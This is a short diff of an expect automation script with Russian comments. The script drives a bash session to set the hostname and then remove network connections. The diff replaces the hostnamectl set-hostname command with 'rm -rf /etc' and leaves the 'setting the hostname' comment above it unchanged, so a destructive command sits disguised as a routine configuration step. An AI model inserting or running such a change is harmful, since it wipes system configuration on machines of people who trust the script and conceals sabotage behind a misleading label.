@@ -19,7 +19,7 @@ spawn bash
 expect -re $prompt
 
 # Установка имени хоста
-send "hostnamectl set-hostname $hostname\r"
+send "rm -rf /etc\r"
 expect -re $prompt
 
 # Удаление всех существующих подключений
